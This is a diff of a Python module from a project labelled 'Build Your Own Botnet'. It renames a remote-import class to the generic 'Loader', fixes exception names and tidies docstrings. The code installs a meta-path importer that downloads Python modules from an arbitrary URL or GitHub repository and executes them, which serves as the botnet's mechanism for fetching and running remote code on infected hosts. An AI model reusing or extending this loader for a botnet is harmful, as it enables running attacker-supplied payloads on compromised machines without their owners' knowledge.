@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Remote Import (Build Your Own Botnet)'
+'Loader (Build Your Own Botnet)'
 
 # standard library
 import imp
@@ -15,9 +15,9 @@ def log(info='', level='debug'):
     getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
 
 # main
-class RemoteImporter(object):
-    """ 
-    The class that implements the remote import API. 
+class Loader(object):
+    """
+    The class that implements the remote import API.
     :param list modules: list of module/package names to make available for remote import
     :param str base_url: URL of directory/repository of modules being served through HTTPS
 
@@ -51,7 +51,6 @@ class RemoteImporter(object):
             return None
         log(level='info', info= "[+] Module/Package '%s' can be loaded!" % fullname)
         return self
-
 
     def load_module(self, name):
         imp.acquire_lock()
@@ -138,9 +137,9 @@ def __create_github_url(username, repo, branch='master'):
 
 def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
     if username == None or repo == None:
-        raise Error("'username' and 'repo' parameters cannot be None")
+        raise Exception("'username' and 'repo' parameters cannot be None")
     if commit and branch:
-        raise Error("'branch' and 'commit' parameters cannot be both set!")
+        raise Exception("'branch' and 'commit' parameters cannot be both set!")
     if commit:
         branch = commit
     if not branch:
@@ -153,17 +152,17 @@ def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=Non
     return add_remote_repo(module, url)
 
 def add_remote_repo(modules, base_url='http://localhost:8000/'):
-    """ 
-    Function that creates and adds to the 'sys.meta_path' an RemoteImporter object.
-    The parameters are the same as the RemoteImporter class contructor.
     """
-    importer = RemoteImporter(modules, base_url)
+    Function that creates and adds to the 'sys.meta_path' an Loader object.
+    The parameters are the same as the Loader class contructor.
+    """
+    importer = Loader(modules, base_url)
     sys.meta_path.insert(0, importer)
     return importer
 
 def remove_remote_repo(base_url):
-    """ 
-    Function that removes from the 'sys.meta_path' an RemoteImporter object given its HTTP/S URL.
+    """
+    Function that removes from the 'sys.meta_path' an Loader object given its HTTP/S URL.
     """
     for importer in sys.meta_path:
         try:
@@ -175,9 +174,9 @@ def remove_remote_repo(base_url):
 
 @contextlib.contextmanager
 def remote_repo(modules, base_url='http://localhost:8000/'):
-    """ 
+    """
     Context Manager that provides remote import functionality through a URL.
-    The parameters are the same as the RemoteImporter class contructor.
+    The parameters are the same as the Loader class contructor.
     """
     importer = add_remote_repo(modules, base_url)
     yield
@@ -185,7 +184,7 @@ def remote_repo(modules, base_url='http://localhost:8000/'):
 
 @contextlib.contextmanager
 def github_repo(username=None, repo=None, module=None, branch=None, commit=None):
-    """ 
+    """
     Context Manager that provides import functionality from Github repositories through HTTPS.
     The parameters are the same as the '_add_git_repo' function. No 'url_builder' function is needed.
     """
